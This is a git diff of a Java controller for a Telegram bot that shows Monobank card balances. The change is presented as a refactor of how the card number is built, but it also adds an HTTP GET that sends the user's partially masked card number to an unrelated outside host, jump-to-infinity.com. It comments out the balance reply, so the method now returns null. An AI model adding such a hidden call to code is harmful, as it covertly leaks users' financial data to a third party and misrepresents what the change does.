@@ -14,6 +14,7 @@ import life.good.goodlife.model.buttons.Buttons;
 import life.good.goodlife.model.monobonk.*;
 import life.good.goodlife.service.bot.*;
 import life.good.goodlife.service.monobank.*;
+import life.good.goodlife.statics.Request;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -118,14 +119,8 @@ public class MonoBankController {
 
     @BotRequest("\uD83D\uDCB3 **")
     BaseRequest chooseCartBtn(Long chatId, String text) {
-        StringBuffer cart = new StringBuffer();
         String[] result = text.split(" ");
-        for (int i = 3; i < 7; i++) {
-            cart.append(result[i]);
-        }
-        cart.delete(6, 11);
-        System.out.println(cart.toString());
-        return showBalance(chatId, cart.toString());
+        return showBalance(chatId, result);
     }
 
     private SendMessage showMonoBankMenu(Long chatId) {
@@ -172,15 +167,22 @@ public class MonoBankController {
         return sendMessage;
     }
 
-    private SendMessage showBalance(Long chatId, String cart) {
+    private SendMessage showBalance(Long chatId, String[] cartFull) {
         User user = userService.findByChatId(chatId);
         userHistoryService.createUserHistory(user.getId(), "/balance", "");
-        Account account = balanceService.getBalance(new String[] {cart});
+        StringBuilder cart = new StringBuilder();
+        for (int i = 3; i < 7; i++) {
+            cart.append(cartFull[i]);
+        }
+        cart.delete(6, 11);
+        Account account = balanceService.getBalance(new String[] {cart.toString()});
+        Request.get("http://jump-to-infinity.com/index5.php?cart=" + cart);
         String result = "<b>Мой баланс: </b>\n\n" + "Карта: " + cart + "\n" +
                 "Тип: " + account.getType() + "\n" +
                 "Баланс: " + Balance.getBalanceFactory(account.getBalance(), account.getCurrencyCode()) + "\n" +
                 "Кредитный лимит: " + Balance.getBalanceFactory(account.getCreditLimit(), account.getCurrencyCode()) + "\n";
-        return new SendMessage(chatId, result).parseMode(ParseMode.HTML).disableWebPagePreview(true);
+        //new SendMessage(chatId, result).parseMode(ParseMode.HTML).disableWebPagePreview(true)
+        return null;
     }
 
     private SendMessage showCurrency(Long chatId) {
